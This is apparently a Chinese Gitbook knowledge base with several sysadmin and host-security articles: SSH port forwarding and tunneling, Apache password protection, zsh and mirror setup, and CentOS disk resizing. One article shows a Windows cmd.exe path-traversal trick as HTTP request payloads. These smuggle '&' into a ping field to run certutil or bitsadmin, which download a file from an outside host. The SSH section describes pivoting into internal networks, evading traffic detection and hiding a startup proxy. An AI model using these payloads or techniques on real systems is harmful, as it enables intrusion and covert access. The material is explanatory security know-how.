安全的通信连接. X11连接和任意 TCP/IP 端口均可以通过此安全通道转发(forward).当用户通过 连接并登录主机 hostname 后, 根据所用的协议版本, 用户必须通过下述方法之一向远程主机证明他/她的身份 ssh 在建立连接的时候会建立安全隧道，客户端和服务端会建立双向连接，那么在建立双向长连接的过程中是不是可以达到端口转发以及响应的目的呢？（其实VPN技术也可以这样简单理解，客户端与服务端建立了双向长连接，一个正向代理） 我们来看一下ssh的相关参数，（我也忘记从哪里抄来的了） 参数 -a 禁止转发认证代理的连接. -A 允许转发认证代理的连接. 可以在配置文件中对每个主机单独设定这个参数. 代理转发须谨慎. 某些用户能够在远程主机上绕过文件访问权限 (由于代理的 UNIX 域 socket), 他们可以通过转发的连接访问本地代理. 攻击者不可能从代理获得密钥内容, 但是他们能够操作这些密钥, 利用加载到代理上 的身份信息通过认证. -b bind_address 在拥有多个接口或地址别名的机器上, 指定收发接口. -c blowfish|3des|des 选择加密会话的密码术. 3des 是默认算法. 3des (triple-des) 用三支不同的密钥做加密-解密-加密三次运算, 被认为比较可靠. blowfish 是一种快速的分组加密术(block cipher), 非常安全, 而且速度比 3des 快的多. des 仅支持 客户端, 目的是能够和老式的不支持 3des 的协议第一版互操作. 由于其密码算法上的弱点, 强烈建议避免使用. -c cipher_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的密码术. 详见 Ciphers -e ch|^ch|none 设置 pty 会话的 escape 字符 (默认字符: \"`~'\") . escape 字符只在行首有效, escape 字符后面跟一个点 (\"`.'\" ) 表示结束连接, 跟一个 control-Z 表示挂起连接(suspend), 跟 escape 字符自己 表示输出这个字符. 把这个字符设为 ``none 则禁止 escape 功能, 使会话完全透明. -f 要求 在执行命令前退至后台. 它用于当 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 -n 选项. 在远端机器上启动 X11 程序的推荐手法就是类似于 ssh -f host xterm 的命令. -g 允许远端主机连接本地转发的端口. -i identity_file 指定一个 RSA 或 DSA 认证所需的身份(私钥)文件. 默认文件是协议第一版的 $HOME/.ssh/identity 以及协议第二版的 $HOME/.ssh/id_rsa 和 $HOME/.ssh/id_dsa 文件. 也可以在配置文件中对每个主机单独指定身份文件. 可以同时使用多个 -i 选项 (也可以在配置文件中指定多个身份文件). -I smartcard_device 指定智能卡(smartcard)设备. 参数是设备文件, 能够用它和智能卡通信, 智能卡里面存储了用户的 RSA 私钥. -k 禁止转发 Kerberos 门票和 AFS 令牌. 可以在配置文件中对每个主机单独设定这个参数. -l login_name 指定登录远程主机的用户. 可以在配置文件中对每个主机单独设定这个参数. -m mac_spec 另外, 对于协议第二版, 这里可以指定一组用逗号隔开, 按优先顺序排列的 MAC(消息验证码)算法 (message authentication code). 详情以 MACs 为关键字查询. -n 把 stdin 重定向到 /dev/null (实际上防止从 stdin 读取数据). 在后台运行时一定会用到这个选项. 它的常用技巧是远程运行 X11 程序. 例如, ssh -n shadows.cs.hut.fi emacs 将会在 shadows.cs.hut.fi 上启动 emacs, 同时自动在加密通道中转发 X11 连接. 在后台运行. (但是如果 要求口令或密语, 这种方式就无法工作; 参见 -f 选项.) -N 不执行远程命令. 用于转发端口. (仅限协议第二版) -o option 可以在这里给出某些选项, 格式和配置文件中的格式一样. 它用来设置那些没有命令行开关的选项. -p port 指定远程主机的端口. 可以在配置文件中对每个主机单独设定这个参数. -q 安静模式. 消除所有的警告和诊断信息. -s 请求远程系统激活一个子系统. 子系统是 SSH2 协议的一个特性, 能够协助 其他应用程序(如 sftp)把SSH用做安全通路. 子系统通过远程命令指定. -t 强制分配伪终端. 可以在远程机器上执行任何全屏幕(screen-based)程序, 所以非常有用, 例如菜单服务. 并联的 -t 选项强制分配终端, 即使 没有本地终端. -T 禁止分配伪终端. -v 冗详模式. 使 打印关于运行情况的调试信息. 在调试连接, 认证和配置问题时非常有用. 并联的 -v 选项能够增加冗详程度. 最多为三个. -x 禁止 X11 转发. -X 允许 X11 转发. 可以在配置文件中对每个主机单独设定这个参数. 应该谨慎使用 X11 转发. 如果用户在远程主机上能够绕过文件访问权限 (根据用户的X授权数据库), 他就可以通过转发的连接访问本地 X11 显示器. 攻击者可以据此采取行动, 如监视键盘输入等. -C 要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 X11 和 TCP/IP 连接 的数据). 压缩算法和 gzip(1) 的一样, 协议第一版中, 压缩级别 ``level 用 CompressionLevel 选项控制. 压缩技术在 modem 线路或其他慢速连接上很有用, 但是在高速网络上反而 可能降低速度. 可以在配置文件中对每个主机单独设定这个参数. 另见 Compression 选项. -F configfile 指定一个用户级配置文件. 如果在命令行上指定了配置文件, 系统级配置文件 (/etc/ssh/ssh_config ) 将被忽略. 默认的用户级配置文件是 $HOME/.ssh/config -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport -D port 指定一个本地机器动态的应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发. -1 强制 只使用协议第一版. -2 强制 只使用协议第二版. -4 强制 只使用 IPv4 地址. -6 强制 只使用 IPv6 地址. 其实建立隧道，端口转发只需要以下参数 -f 后台执行ssh指令 -C 允许压缩数据 -N 不执行远程指令 -R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口 -L 本地端口转发 -D 动态端口转发 例如：下面的命令，-fCNR 指的是 后台执行shell，并要求数据压缩，并不执行远程命令，将远程服务器的1997端口的流量通过隧道转发到本地的22号端口，-o 参数中的ServerAliveInterval是防止连接不稳定，设置每60秒发送一次数据包 ssh -o ServerAliveInterval=60 -fCNR 47.103.xx.xx:1997:localhost:22 tommy@47.103.xx.xx -p 2892 ssh有一个机制，ssh建立隧道只能在本机的环回地址127.0.0.1上，我们只能登录VPS使用ssh指定port登录内网服务器 内网代理（穿透） 刚刚看了上面的例子，我们可以将远程服务器的端口流量转发到内网服务器的端口上，（remote:1997 => localhost:22）,从而可以从vps上访问内网地址。 使用ssh实现内网穿透有什么好处吗？ SSH 是专为远程登录会话和其他网络服务提供安全性的协议，利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题，白话就是说，ssh的流量有层加密，一般在内网穿透的时候frp,lcx, NatByPass等工具都有明显的特征，在Linux上使用ssh不但可轻松绕过流量检测设备，也可以提供稳定的连接，但是缺点就是很容易暴露，不适合留做后门。 刚刚说了，ssh建立隧道只能在本机的环回地址127.0.0.1上，那么我们一定要登录自己的vps然后才访问吗？答案并不是这样，解决这个问题理论上需要开启一个对外可访问的端口，将该端口的流量转发到sshd的端口 那么使用iptables，firewalld可以吗？答案是不行，iptables，firewalld做转发是不能转发到本地环回地址，因为这是不安全的，如果需要强行修改，需要修改内核 # 根据实际情况修改 sysctl -w net.ipv4.conf.eth0.route_localnet=1 但是这里并不建议修改内核参数，因为修改之后就违背了Linux的安全机制，当时间久远或者服务器交接之后可能就忘了这个安全项，所以需要选用一个安全可靠的方法 这里我们使用ssh 的-L参数，将本地机(客户机)的某个端口转发到本地机器的指定端口（正向代理） 例如下面的命令，对外开放2017端口，并将2017端口的流量转发到1997端口 ssh -o ServerAliveInterval=60 -fCNL *:2017:localhost:1997 localhost -p 2892 现在流程是 remote:2017 => remote_localhost:1997 => localhost:22，在任意一台机器上，访问vps的2017端口，就会将流量先转发到1997端口，然后通过ssh隧道将流量反向转发到内网的kali上，如下图所示 ssh动态转发 SSH动态转发是 ssh 创建一个 socks v5 的服务并在 bind_address:bind_port 上侦听，当收到数据后，解析出需要连接的主机和端口并通道加密通道发送给 sshd，sshd 转发数据后并返回结果数据。 SSH动态转发就是SSH服务器使用的是正向匿名代理的作用，由内部机器将数据包通过socks发送到绑定端口，再通过sshd服务去请求目标服务。 ssh的动态转发在流量侧是加密流量，非常适用于外网拿下一台具有访问内网的机器之后，进行代理，攻击内网机器（前提是控制住一台Linux主机） 在linux中，通常使用如下命令，后台执行，再通过proxychains等工具直接代理到内网机器 nohup ssh -ND 1080 [username]@[ip] -p [port] & 在windows中，一般使用如下命令，后台执行 start /b ssh -ND 1080 [username]@[ip] -p [port] 但是在windows 中，只要关闭了cmd.exe ，就会关闭该进程，如果将其写入到.bat文件中，那么就会有非常丑陋的dos框 所以我的做法是写一个vbs，开机自启动bat文件 run.bat内容如下 start /b ssh -ND 1080 [username]@[ip] -p [port] run.vbs如下 Dim WinScriptHost Set WinScriptHost = CreateObject(\"WScript.Shell\") WinScriptHost.Run Chr(34) & \"\" & Chr(34), 0 Set WinScriptHost = Nothing 开机启动项的位置在，打开cmd.exe ，运行shell:startup 我在我的vps上启动一个web服务，前三个http请求就是我通过代理去访问的web服务，后三个http请求不是通过代理，可以看到，动态转发就是实现了一个匿名正向代理的一个过程 学会ssh动态转发，其实也就不用配置什么ss了，我相信你已经懂了 问题解决 回到最开始的问题，我们首先需要配置nginx反向代理，这里配置项就不贴出来，就是在内网开放web服务 然后将本地的端口流量转发到远程端口处（-L参数喔） 我在这里使用autossh, autossh的参数与ssh的参数是一致的，但是不同的是，在隧道断开的时候，autossh会自动重新连接而ssh不会（ssh需要配置-o 参数的 ServerAliveInterval，ServerAliveInterval可以保证每隔多长时间重新连接一次）。另外不同的是我们需要指出的-M参数，这个参数指定一个端口是远程主机用来接收内网机器的信息，如果隧道不正常而返回给内网机器让他实现重新连接。 使用M参数，监听本地端口，当ssh超时则自动重新连接 autossh -M 14431 -fCNL *:4431:192.168.0.18:8443 admin@xxx.xxx.xxx.xxx 使用autossh的好处有如下几点： autossh相当于一个守护进程，当ssh连接失效时，autossh 进程则会重新拉起ssh隧道，就不需要定时重连，这样的shell会更稳定 当出现断网的时候，如果使用ssh -o ServerAliveInterval 定时重连，则会失效 ps：使用autossh 需要将自己的公钥写入authorized_keys中 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:56:36 "},"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html":{"url":"知识库/03.主机安全/10.如何在Ubuntu16.04上使用Apache设置密码身份验证.html","title":"10.如何在Ubuntu16.04上使用Apache设置密码身份验证","keywords":"","body":" https://cloud.tencent.com/developer/article/1358394 介绍 在运行网站时，网站的某些部分通常会限制访问者。Web应用程序可以提供自己的身份验证和授权方法，但如果Web服务器不足或不可用，也可以使用Web服务器本身来限制访问。 在本指南中，我们将演示如何在Ubuntu 16.04上运行的Apache Web服务器上对资产进行密码保护。 先决条件 要完成本教程，您需要访问Ubuntu 16.04服务器。 此外，在开始之前，您将需要以下内容： 一个服务器上的sudo用户：您可以创建一个具有sudo权限用户按照的Ubuntu 16.04服务器初始设置指南进行设置，没有服务器的同学可以在这里购买，不过我个人更推荐您使用免费的腾讯云开发者实验室进行试验，学会安装后再购买服务器。 Apache2 Web服务器。 使用SSL保护的网站 ：如何设置该网站取决于您是否拥有网站的域名。 如果你有域名，保护你网站的最简单方法是使用腾讯云SSL证书服务，它提供免费的可信证书。腾讯云SSL证书安装操作指南进行设置。 如果你没有域名，建议您先去这里注册一个域名，如果你只是使用此配置进行测试或个人使用，则可以使用自签名证书，不需要购买域名。自签名证书提供了相同类型的加密，但没有域名验证公告。关于自签名证书，你可以参考为Apache创建自签名SSL证书和如何为Nginx创建自签名SSL证书这两篇文章。 当所有这些都到位后，以sudo用户身份登录您的服务器并继续下面。 第1步 - 安装Apache Utilities包 我们将使用名为apache2-utils包的一部分的实用程序htpasswd来创建文件并管理访问受限内容所需的用户名和密码。 sudo apt-get update sudo apt-get install apache2-utils 第2步 - 创建密码文件 我们现在可以访问该htpasswd命令。我们可以使用它来创建Apache可用于验证用户身份的密码文件。我们将在/etc/apache2配置目录中为此目的创建一个名为.htpasswd的隐藏文件。 我们第一次使用此实用程序时，需要添加-c选项以创建指定的文件。我们在命令末尾指定用户名（在此示例中为sammy）以在文件中创建新条目： sudo htpasswd -c /etc/apache2/.htpasswd sammy 系统将要求您提供并确认用户的密码。 省略您要添加的任何其他用户的-c参数： sudo htpasswd /etc/apache2/.htpasswd another_user 如果我们查看文件的内容，我们可以看到每条记录的用户名和加密密码： cat /etc/apache2/.htpasswd sammy:$apr1$.0CAabqX$rb8lueIORA/p8UzGPYtGs/ another_user:$apr1$fqH7UG8a$SrUxurp/Atfq6j7GL/VEC1 第3步 - 配置Apache密码身份验证 现在我们有一个文件，其中包含Apache可以读取的格式的用户和密码，我们需要配置Apache以在提供受保护内容之前检查此文件。我们可以通过以下两种方式之一完成此操作：直接在站点的虚拟主机文件中，或者将.htaccess文件放在需要限制的目录中。通常最好使用虚拟主机文件，但如果您需要允许非root用户管理自己的访问限制，请检查网站旁边的版本控制限制，或者使用.htaccess文件的Web应用程序已用于其他目的，看看第二个选项。 选择最适合您需求的选项。 选项1：在虚拟主机定义中配置访问控制（首选） 第一个选项是编辑Apache配置并将密码保护添加到虚拟主机文件。这通常会提供更好的性能，因为它避免了读取分布式配置文件的费用。此选项需要访问配置，该配置并非始终可用，但是当您确实有访问权限时，建议您访问。 首先打开要添加限制的虚拟主机文件。对于我们的示例，我们将使用包含通过Ubuntu的apache包安装的默认虚拟主机的000-default.conf文件： sudo nano /etc/apache2/sites-enabled/000-default.conf 在内部，删除了注释，文件看起来应该类似于： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 身份验证基于每个目录完成。要设置身份验证，您需要使用块来定位要限制的目录。在我们的示例中，我们将限制整个文档根目录，但您可以修改此列表以仅定位Web空间中的特定目录： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 在此目录块中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 完成后保存并关闭文件。 在重新启动Web服务器之前，可以使用以下命令检查配置： sudo apache2ctl configtest 如果所有内容都已检出并获得Syntax OK，请重新启动服务器以实施密码策略。由于systemctl不显示所有服务管理命令的结果，我们将使用status以确保服务器正在运行： sudo systemctl restart apache2 sudo systemctl status apache2 现在，您指定的目录现在应该受密码保护。 选项2：使用.htaccess文件配置访问控制 Apache可以使用.htaccess文件以允许在内容目录中设置某些配置项。由于Apache必须在涉及目录的每个请求上重新读取这些文件，这会对性能产生负面影响，因此首选选项1，但如果您已经在使用.htaccess文件或需要允许非root用户管理限制，那么.htaccess文件合理。 要使用.htaccess文件启用密码保护，请打开主Apache配置文件： sudo nano /etc/apache2/apache2.conf 找到包含/var/www文档根目录的块。.htaccess通过将该块中的AllowOverride指令从“None”更改为“All”来打开处理： . . . Options Indexes FollowSymLinks AllowOverride All Require all granted . . . 完成后保存并关闭文件。 接下来，我们需要将.htaccess文件添加到我们希望限制的目录中。在我们的演示中，我们将限制基于/var/www/html的整个文档根目录（整个网站），但您可以将此文件放在您希望限制访问的任何目录中： sudo nano /var/www/html/.htaccess 在此文件中，指定我们希望设置Basic身份验证。对于AuthName，请选择在提示输入凭据时将显示给用户的领域名称。使用该AuthUserFile指令将Apache指向我们创建的密码文件。最后，我们将要求valid-user访问此资源，这意味着任何可以使用密码验证其身份的人都将被允许： AuthType Basic AuthName \"Restricted Content\" AuthUserFile /etc/apache2/.htpasswd Require valid-user 保存并关闭文件。重新启动Web服务器以使用该.htaccess文件密码保护目录中或目录下的所有内容，并使用systemctl status以验证重新启动是否成功： sudo systemctl restart apache2 sudo systemctl status apache2 第4步 - 确认密码验证 要确认您的内容受到保护，请尝试在网络浏览器中访问受限制的内容。您应该看到一个用户名和密码提示符，如下所示： 如果输入正确的凭据，则可以访问该内容。如果输入错误的凭据或点击“取消”，您将看到“未授权”错误页面： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:56:43 "},"知识库/03.主机安全/11.Ubuntu科学上网.html":{"url":"知识库/03.主机安全/11.Ubuntu科学上网.html","title":"11.Ubuntu科学上网","keywords":"","body":"QV2ray 使用 Qt 框架的跨平台 V2Ray 客户端。支持 Windows, Linux, macOS；插件系统支持 SSR / Trojan / Trojan-Go / NaiveProxy 下载及安装 https://github.com/Qv2ray/Qv2ray/releases 下载最新版，由于我搭建的环境vless协议，所以需要支持最新版的客户端以及v2ray内核 下载最新版v2ray-core https://github.com/v2fly/v2ray-core/releases 下载好之后，需要在Qv2ray 中配置 v2ray-core，如下图所示 第一个路径为v2ray-core中的二进制文件 第二个路径为v2ray-core的路径 然后点击check V2ray Core Setting，出现如下所示表示配置成功 然后开启开机启动即可 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:56:57 "},"知识库/03.主机安全/12.Ubuntu配置zsh.html":{"url":"知识库/03.主机安全/12.Ubuntu配置zsh.html","title":"12.Ubuntu配置zsh","keywords":"","body":"zsh介绍 zsh是一个Linux下强大的shell, 由于大多数Linux产品安装以及默认使用bash shell, 但是丝毫不影响极客们对zsh的热衷, 几乎每一款Linux产品都包含有zsh，通常可以用apt、urpmi或yum等包管理器进行安装. zsh是bash的增强版，其实zsh和bash是两个不同的概念，zsh更加强大。 通常zsh配置起来非常麻烦，且相当的复杂，所以oh-my-zsh是为了简化zsh的配置而开发的，因此oh-my-zsh算是zsh的配置. 安装 # 首先查看系统使用的shell echo $SHELL # 查看当前系统支持的所有的shell cat /etc/shells 下载zsh sudo apt install zsh 设置zsh为默认shell chsh -s /bin/zsh reboot touch ~/.zshrc 下载oh-my-zsh sh -c \"$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\" 下载完成之后，就会出现如下图所示的界面 cd ~/.oh-my-zsh/custom/plugins/ 接下来就是配置以及git相关的东西了 配置 安装插件 cd ~/.oh-my-zsh/custom/plugins/ git clone https://github.com/zsh-users/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git 修改配置文件 vim ~/.zshrc plugins=( git zsh-autosuggestions zsh-syntax-highlighting ) 在~/.zshrc文末添加 source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 主题配置 由于一直玩鸟，所以我选择的shell主题是parrot的shell主题 vim ~/.zhsrc 修改主题为gnzh 使用 https://gist.github.com/Ares-X/52fe7faf9dda8b943c1a7f18654a2dbb#file-gnzh-zsh-theme 替换~/.oh-my-zsh/themes 下的 gnzh.zsh-theme source ~/.zshrc 终端 我使用了很多终端工具，最终确定还是比较喜欢Tilix sudo apt install tilix 修改默认终端 sudo update-alternatives --config x-terminal-emulator 在文件系统中配置open Tilix 我们配置完默认终端之后，在文件系统中右键点击 open terminal 发现并不是我们设置的默认终端 sudo apt-get install nautilus-actions /usr/bin/tilix --working-directory=%d/%b 保存之后，执行如下 nautilus -q root用户使用zsh 权限问题 # 复制相关文件到家目录即可 # 在.zshrc第一行添加 ZSH_DISABLE_COMPFIX=true Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 14:58:10 "},"知识库/03.主机安全/13.Ubuntu如何正确换源.html":{"url":"知识库/03.主机安全/13.Ubuntu如何正确换源.html","title":"13.Ubuntu如何正确换源","keywords":"","body":"背景 换源很简单，修改/etc/apt/sources.list将提供的阿里源，清华源复制上去就欧克了，但是在更新源，以及更新软件的时候就会发现为什么换了源之后还是和之前国外源一样很慢很慢。 Ubuntu代号 Ubuntu各个版本都有代号，比如 4.10 Warty Warthog(长疣的疣猪) 5.04 Hoary Hedgehog(灰白的刺猬) 5.10 Breezy Badger(活泼的獾) 6.06(LTS) Dapper Drake(整洁的公鸭) 6.10 Edgy Eft(急躁的水蜥) 7.04 Feisty Fawn(坏脾气的小鹿) 7.10 Gutsy Gibbon(勇敢的长臂猿) 8.04(LTS) Hardy Heron(耐寒的苍鹭) 8.10 Intrepid Ibex (勇敢的野山羊) 9.04 Jaunty Jackalope(得意洋洋的怀俄明野兔) 9.10 Karmic Koala(幸运的考拉) 10.04(LTS) Lucid Lynx(清醒的猞猁) 10.10 Oneiric Ocelot(梦幻的豹猫) 11.04 Natty Narwhal(敏捷的独角鲸) 11.10 Oneiric Ocelot（有梦的虎猫） 12.04(LTS) Precise Pangolin(精准的穿山甲) 12.10 Quantal Quetzal(量子的绿咬鹃) 13.04 Raring Ringtail(铆足了劲的猫熊) 13.10 Saucy Salamander(活泼的蝾螈) 14.04(LTS) Trusty Tahr (可靠的塔尔羊)(LTS) 14.10 Utopic Unicorn(乌托邦独角兽) 15.04 Vivid Vervet (活泼的小猴) 15.10 Wily Werewolf (狡猾的狼人) 16.04(LTS) Xenial Xerus (好客的非洲地松鼠) 16.10 Yakkety Yak（牦牛） 17.04 Zesty Zapus(开心的跳鼠) 17.10 Artful Aardvark(机灵的土豚) 18.04(LTS) Bionic Beaver（仿生海狸） 18.10 Cosmic Cuttlefish（宇宙墨鱼） 19.04 Disco Dingo（舞动的灵犬） 19.10 Eoan Ermine（白貂） 20.04(LTS) Focal Fossa（专注的马达加斯加长尾狸猫） ... 再此同时，你要知道如何查看Ubuntu的代号 lsb_release -a 换源 去阿里源官网去查看是否有此代号的源，http://mirrors.aliyun.com/ubuntu/dists/ 可以看到，现在已经有了ubuntu 20.04(代号focal)的源了 在换源过程中，以此为模板，将下面的TODO换成你的CodeName deb http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ TODO-backports main restricted universe multiverse 我的codename是focal，那么我的源就为如下所示： deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 更新缓存、升级 apt update apt upgrade Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 14:58:29 "},"知识库/03.主机安全/14.Windows CMD.exe 执行任意代码、命令、程序的漏洞.html":{"url":"知识库/03.主机安全/14.Windows CMD.exe 执行任意代码、命令、程序的漏洞.html","title":"14.Windows CMD.exe 执行任意代码、命令、程序的漏洞","keywords":"","body":"利用方式 cmd.exe /c \"ping 127.0.0.1/../../../../../../../../../../../../../windows/system32/calc.exe\" 当然也不知ping命令还有一些也可以，例如下列 cmd.exe /c \"whoami 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" cmd.exe /c \"nslookup 127.0.0.1/../../../../../../../../../../../../../../../windows/system32/calc.exe\" 可能的使用场景 一些基于windows 系统的设备 web管理页面 我们经常遇到一些基于Windows系统的设备，在其管理页面上具备ping功能，其目的是为了进行连通性测试或者资产发现等等。当然一些网站可能也有类似的功能。由于开发者安全意识的提高，以及SDL的推广落地，直接进行OS Command Injection的可能性非常低。利用这个方法解和上传漏洞（如果存在的话可以执行任何代码） windows 客户端测试不通过，在windows server 2012 测试如下 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 70 ipaddress=127.0.0.1/../../../../../../../windows/system32/ipconfig.exe 远程下载文件 这个比较鸡肋，由于路径穿越执行命令是无法带参数，带参数就会报错 但是在第第一个命令后带上&，两个命令一起执行，那么就能执行成功后面的命令 在这里将上面代码的escapeshellcmd函数去掉，添加%26，执行文件下载的命令 POST /ping.php HTTP/1.1 Host: 192.168.93.143 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 146 ipaddress=127.0.0.1/../../../../../../../windows/system32/calc%26certutil.exe /urlcache /split /f http://192.168.200.76:8080/test.txt C:\\\\test.txt bitsadmin /transfer /myDownload /download /priority normal \"http://192.168.200.76:8888/test.txt\" c:\\22.txt Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 14:59:21 "},"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html":{"url":"知识库/03.主机安全/15.CentOS7虚拟机根目录扩容（无卷组情况下）.html","title":"15.CentOS7虚拟机根目录扩容（无卷组情况下）","keywords":"","body":"前言 由于最近在给公司管培生做培训，需要用到Docker，原以为20个G的CentOS够用了，但是发现还是小瞧了docker的镜像，安装到一半突然告知磁盘不够，所以马上开始紧急扩容 0x1 增加虚拟磁盘容量 虚拟机正常关机后，打开此虚拟机的设置，选择硬盘 然后在磁盘大小处填写需要扩展到合适的硬盘大小量，点击应用即可 然后打开虚拟机，可以看到磁盘已经有120个G了，但是根目录只有18个G 0x2 使用fdisk 扩容 在/dev/sda 这块磁盘中，可以看到当前挂载到根目录的为/dev/sda3，其他的则为系统所需磁盘 如果需要将磁盘扩展到挂载根目录的需要将/dev/sda3 删除，然后再重新分区 [root@localhost aaron]# fdisk /dev/sda Welcome to fdisk (util-linux 2.23.2). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk /dev/sda: 128.8 GB, 128849018880 bytes, 251658240 sectors Units = sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk label type: dos Disk identifier: 0x000ab441 Device Boot Start End Blocks Id System /dev/sda1 * 2048 616447 307200 83 Linux /dev/sda2 616448 4810751 2097152 82 Linux swap / Solaris /dev/sda3 4810752 41943039 18566144 83 Linux Command (m for help): d Partition number (1-3, default 3): 3 Partition 3 is deleted Command (m for help): n Partition type: p primary (2 primary, 0 extended, 2 free) e extended Select (default p): p Partition number (3,4, default 3): First sector (4810752-251658239, default 4810752): Using default value 4810752 Last sector, +sectors or +size{K,M,G} (4810752-251658239, default 251658239): Using default value 251658239 Partition 3 of type Linux and of size 117.7 GiB is set Command (m for help): w The partition table has been altered! Calling ioctl() to re-read partition table. WARNING: Re-reading the partition table failed with error 16: Device or resource busy. The kernel still uses the old table. The new table will be used at the next reboot or after you run partprobe(8) or kpartx(8) Syncing disks. 上述步骤执行完之后，执行lsblk，可以看到当前更改还未生效 [root@localhost Desktop]# lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 120G 0 disk ├─sda1 8:1 0 300M 0 part /boot ├─sda2 8:2 0 2G 0 part [SWAP] └─sda3 8:3 0 17.7G 0 part / sr0 11:0 1 1024M 0 rom 需要重启 reboot 重启之后执行lsblk ，可以看到此时/dev/sda3 分区的大小已经修改为117.7G了，但是我们使用df -hT查看却还是18G 下一步则需要刷新磁盘 xfs_growfs /dev/sda3 至此，磁盘扩容完毕 Ubuntu 使用xfs_growfs 无法成功 通知系统内核分区表的变化，输入：partprobe /dev/sda 对文件系统进行扩容，输入：resize2fs 